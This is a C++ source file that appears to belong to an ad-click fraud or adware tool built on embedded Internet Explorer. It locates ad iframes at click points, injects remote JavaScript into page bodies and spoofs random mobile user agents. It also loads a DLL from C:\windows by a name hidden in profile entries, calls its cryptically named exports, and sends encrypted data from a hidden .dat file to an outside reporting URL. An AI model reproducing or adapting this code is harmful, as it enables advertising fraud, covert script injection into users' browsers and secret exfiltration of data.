#include "stdafx.h"
#include "PublicFun.h"

LPCWSTR pszArrayMatrixID[]={
	L"e1fba969356f44ef70ab",
	L"984f15546abd8c759d73"
};


BOOL IsOurMatrixUrl( LPCWSTR pszMatrixUrl )
{
	return TRUE;

	BOOL bOurMatrix = FALSE;
	int nMatrixIDCount = _countof(pszArrayMatrixID);
	for (int i=0;i<nMatrixIDCount;i++)
	{
		CString strMatrixID;
		CString strTestMatrixUrl;
		strMatrixID = pszArrayMatrixID[i];
		strMatrixID.MakeLower();

		strTestMatrixUrl = pszMatrixUrl;
		strTestMatrixUrl.MakeLower();
		if (strTestMatrixUrl.Find(strMatrixID) >= 0 )
		{
			bOurMatrix = TRUE;
			break;
		}
	}

	return bOurMatrix;
}

int GetRandValue(int nMin ,int nMax)
{
	static bool bInit = false;
	if (bInit == false)
	{
		bInit = true;
		srand(time(NULL));
	}

	return rand()%(nMax - nMin + 1) + nMin;
}

BOOL IsRightMatrix(IWebBrowser *pWb,CPoint ptClick)
{
	if( NULL == pWb )
	{
		return FALSE;
	}


	CComQIPtr<IHTMLDocument2> pDoc2;
	pWb->get_Document((IDispatch **)&pDoc2);

	if ( NULL == pDoc2 )
	{
		return FALSE;
	}

	CComQIPtr<IHTMLElement> pElem;
	pDoc2->elementFromPoint(ptClick.x,ptClick.y,&pElem);

	if ( NULL == pElem )
	{
		return FALSE;
	}

	BSTR bstrTagName;
	pElem->get_tagName(&bstrTagName);
	if (CString(bstrTagName).CompareNoCase(L"iframe") != 0)
	{
		return FALSE;
	}

	CComVariant vtAttrValue;
	HRESULT hr =pElem->getAttribute(L"src",2,&vtAttrValue);

	if( vtAttrValue.vt == VT_BSTR  /*&& CString(vtAttrValue.bstrVal).Find(L".yxk6.com/bid") >= 0*/  /*是矩阵*/)
	{
		BOOL bOutMatrix = TRUE;
		
		//bOutMatrix = IsOurMatrixUrl( vtAttrValue.bstrVal );

		if( bOutMatrix )
		{
			return TRUE;
		}
		else
		{
			g_Loger.StatusOut(L"Fount Other Matrix:%s",vtAttrValue.bstrVal);
		}

	}
	return FALSE;
}

BOOL IsRightPhoneMatrix(IWebBrowser *pWb,CPoint ptClick)
{

	if( NULL == pWb )
	{
		return FALSE;
	}


	CComQIPtr<IHTMLDocument2> pDoc2;
	pWb->get_Document((IDispatch **)&pDoc2);

	if ( NULL == pDoc2 )
	{
		return FALSE;
	}

	CComQIPtr<IHTMLElement> pElem;
	pDoc2->elementFromPoint(ptClick.x,ptClick.y,&pElem);

	if ( NULL == pElem )
	{
		return FALSE;
	}

	BSTR bstrTagName;
	pElem->get_tagName(&bstrTagName);
	if (CString(bstrTagName).CompareNoCase(L"iframe") != 0)
	{
		return FALSE;
	}

	CComVariant vtAttrValue;
	HRESULT hr =pElem->getAttribute(L"src",2,&vtAttrValue);

	if( vtAttrValue.vt == VT_BSTR  && CString(vtAttrValue.bstrVal).Find(L"http://api.adxiaozi.com") >= 0  /*是矩阵*/)
	{
		return TRUE;
	}
	else
	{
		g_Loger.StatusOut(L"Fount Other Matrix:%s",vtAttrValue.bstrVal);
	}
	return FALSE;
}

BOOL InjectDomNode(IWebBrowser *pWb,CString strJSUrl)
{
	if (pWb == NULL)
	{
		return FALSE;
	}
	CComQIPtr<IHTMLDocument> pDoc;
	HRESULT hr = pWb->get_Document((IDispatch **)&pDoc);
	if ( FAILED(hr) || pDoc == NULL )
	{
		return FALSE;
	}

	CComQIPtr<IHTMLDocument2> pDoc2(pDoc);
	if (pDoc2 == NULL)
	{
		return FALSE;
	}

	CComQIPtr<IHTMLBodyElement> pBody(pDoc2);
	pDoc2->get_body((IHTMLElement **)&pBody);
	if (pBody == NULL)
	{
		return FALSE;
	}


	CComQIPtr<IHTMLElement> pElem;   
	CComQIPtr<IHTMLElement> pJscript;

	CComQIPtr<IHTMLDocument3> pDoc3 = pDoc;
	CComQIPtr<IDispatch> iDisp;
	CComBSTR PJsType = _T("script");      //javascript对象 

	hr = pDoc2->createElement(PJsType,&pJscript); //创建新元素对象
	if(FAILED(hr) || !pJscript ) 
		return FALSE;  

	pJscript->setAttribute(CComBSTR("type"),CComVariant("text/javascript"),0); //设置JS类型
	pJscript->setAttribute(CComBSTR("src"),CComVariant(strJSUrl),0); //设置JS类型
	pJscript->setAttribute(CComBSTR("charset"),CComVariant("gb2312"),0);
	//pJscript->setAttribute(CComBSTR("defer"),CComVariant(VARIANT_TRUE),0); //设置加载延迟（必须的）	
	//pJscript->setAttribute(CComBSTR("defer"),CComVariant("defer"),0); //设置加载延迟（必须的）	

	CComQIPtr< IHTMLDOMNode, &IID_IHTMLDOMNode > pBodyNode(pBody); //转为节点对象 

	if(pBodyNode && pDoc) 
	{ 
		CComQIPtr<IHTMLDOMNode,&IID_IHTMLDOMNode> pNewChild(pJscript); //转为节点对象 
		CComPtr<IHTMLDOMNode> pRefChild; 

		hr = pBodyNode->appendChild(pNewChild, &pRefChild); //加载body页面后面
		return hr==S_OK;
	} 
	return E_FAIL;
}


DWORD WINAPI DelayThread(PVOID pParam)
{
	Sleep((DWORD)pParam);
	ExitProcess(1111);
	return 0;
}
VOID DelayExitProcess(int nMinSecond)
{
	static BOOL bDelayExit = FALSE;
	if (FALSE == bDelayExit)
	{
		bDelayExit = TRUE;
#ifdef DEBUG
		OutputDebugStringW(L"延时退出进程\n");
#endif
		CreateThread(NULL,0,DelayThread,(PVOID)nMinSecond,0,NULL);

	}
}


CString GetRandPhoneUserAgent()
{
	LPCWSTR pArrayPhoneUserAgent[]={
		// 	L"Mozilla/5.0 (iPad;  CPU OS 4_2 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C134",
		// 		L"Mozilla/5.0 (iPad;  CPU OS 4_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
		// 		L"Mozilla/5.0 (iPad;  CPU OS 4_3_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5",
		// 		L"Mozilla/5.0 (iPad;  CPU OS 4_3_2 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5",
		// 		L"Mozilla/5.0 (iPad;  CPU OS 4_3_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
		// 		L"Mozilla/5.0 (iPad;  CPU OS 4_3_4 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5",
		// 		L"Mozilla/5.0 (iPad;  CPU OS 4_3_5 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5",
		// 		L"Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3",
		// 		L"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
		// 		L"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25",
		// 		L"Mozilla/5.0 (Linux;  Android 2.1-update1; SonyEricssonSO-01B Build/2.0.2.B.0.29) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
		// 		L"Mozilla/5.0 (Linux;  Android 2.2.1; Full Android Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.2.1; IS03 Build/S9090) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.3; SC-02C Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.3; INFOBAR A01 Build/S9081) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.3; 001HT Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.3; SonyEricssonX10i Build/3.0.1.G.0.75) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.4; SonyEricssonIS11S Build/4.0.1.B.0.112) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.4; IS05 Build/S9290) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.5; F-05D Build/F0001) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 2.3.5; T-01D Build/F0001) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 3.0.1; MZ604 Build/H.6.2-20) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.1; en-us; K1 Build/HMJ37) AppleWebKit/534.13(KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.1; AT100 Build/HMJ37) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.1; Sony Tablet S Build/THMAS10000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.2; SC-01D Build/MASTER) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.2; AT1S0 Build/HTJ85B) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.2; F-01D Build/F0001) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.2; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		// 		L"Mozilla/5.0 (Linux;  Android 3.2; A01SH Build/HTJ85B) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
		// 		L"Mozilla/5.0 (Linux;  Android 3.2.1; Transformer TF101 Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
		L"Mozilla/5.0 (Linux; Android 4.0.1; Galaxy Nexus Build/ITL41D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		L"Mozilla/5.0 (Linux; Android 4.0.3; URBANO PROGRESSO Build/010.0.3000) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		L"Mozilla/5.0 (Linux; Android 4.0.3; Sony Tablet S Build/TISU0R0110) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
		L"Mozilla/5.0 (Linux; Android 4.0.4; SC-06D Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		L"Mozilla/5.0 (Linux; Android 4.1.1; Galaxy Nexus Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		L"Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03S) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
		//L"Opera/9.80 (Android 2.3.3; Linux; Opera Mobi/ADR-1111101157;  ja) Presto/2.9.201 Version/11.50",
		//L"Opera/9.80 (Android 3.2.1; Linux; Opera Tablet/ADR-1109081720;  ja) Presto/2.8.149 Version/11.10",
		//L"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
		//L"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; KDDI-TS01; Windows Phone 6.5.3.5)",
		//L"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; FujitsuToshibaMobileCommun; IS12T; KDDI)"
	};


	int nCount = _countof(pArrayPhoneUserAgent);

	return pArrayPhoneUserAgent[GetRandValue(0,nCount-1)];
}


typedef BOOL (WINAPI *TypeGetDesStringA)(char* srcStr,char* outStr,int Type/*char* keyStr=NULL*/);
typedef BOOL (WINAPI *TypeGetDesStringW)(WCHAR* srcStrW,WCHAR* outStrW,int Type/*WCHAR* keyStr=NULL*/);
typedef BOOL (WINAPI *TypeGetCryptStringA)(char* srcStr,char* outStr,int Type/*char* keyStr=NULL*/);
typedef BOOL (WINAPI *TypeGetCryptStringW)(WCHAR* srcStrW,WCHAR* outStrW,int Type/*WCHAR* keyStrWr=NULL*/);
typedef BOOL (WINAPI *TypeGetUrlData)(LPCTSTR lpUrl,char* GetData);

TypeGetDesStringA GetDesStringA = NULL;
TypeGetDesStringW GetDesStringW = NULL;
TypeGetCryptStringA GetCryptStringA = NULL;
TypeGetCryptStringW GetCryptStringW = NULL;
TypeGetUrlData GetUrlData = NULL;
BOOL InitPublicFun()
{
	CString strPublicDll;
	GetProfileString( L"INITMain" , L"INIT1" , L"" , strPublicDll.GetBuffer(MAX_PATH),MAX_PATH);
	strPublicDll.ReleaseBuffer();

	HMODULE hPublicModule = NULL;

	hPublicModule = LoadLibraryW(L"C:\\windows\\"+strPublicDll+L".dll");
	if ( hPublicModule == NULL )
	{
		GetProfileString( L"XINITMain" , L"INIT1" , L"" , strPublicDll.GetBuffer(MAX_PATH),MAX_PATH);
		strPublicDll.ReleaseBuffer();

		hPublicModule = LoadLibraryW(L"C:\\windows\\"+strPublicDll+L".dll");			
	}

	if (!hPublicModule) return FALSE;

	GetDesStringA=(TypeGetDesStringA)GetProcAddress(hPublicModule,"o010");
	GetDesStringW=(TypeGetDesStringW)GetProcAddress(hPublicModule,"o011");
	GetCryptStringA=(TypeGetCryptStringA)GetProcAddress(hPublicModule,"o005");
	GetCryptStringW=(TypeGetCryptStringW)GetProcAddress(hPublicModule,"o006");
	GetUrlData=(TypeGetUrlData)GetProcAddress(hPublicModule,"o004");

	return GetDesStringA && GetDesStringW && GetCryptStringA && GetCryptStringW && GetUrlData;
}

BOOL ReportToServer(LPCWSTR pszAddOnInfo)
{
	static BOOL bInitPublic = FALSE;
	if ( FALSE == bInitPublic )
	{
		bInitPublic = TRUE;
		InitPublicFun();
	}
	
	if (GetCryptStringW && GetDesStringW && GetUrlData )
	{
		CString strReportData;
		GetPrivateProfileString(L"RPT_TMP",L"RPT_HEAD",L"",strReportData.GetBuffer(1000),1000,L"C:\\windows\\E920F81D2FD7.dat");
		strReportData.ReleaseBuffer();

		GetDesStringW(strReportData.GetBuffer(),strReportData.GetBuffer(strReportData.GetLength()),0);
		strReportData.ReleaseBuffer();

		strReportData+=pszAddOnInfo;


		GetCryptStringW(strReportData.GetBuffer(),strReportData.GetBuffer(strReportData.GetLength()*4+100),0);
		strReportData.ReleaseBuffer();

		//http://up.58ny.com/ux/upurl.aspx?info=
		CString strReportUrl;
		strReportUrl.Format(L"http://up.58ny.com/ux/upurl.aspx?info=%s",strReportData);

		GetUrlData( strReportUrl ,NULL);
	}
	

	return TRUE;

}
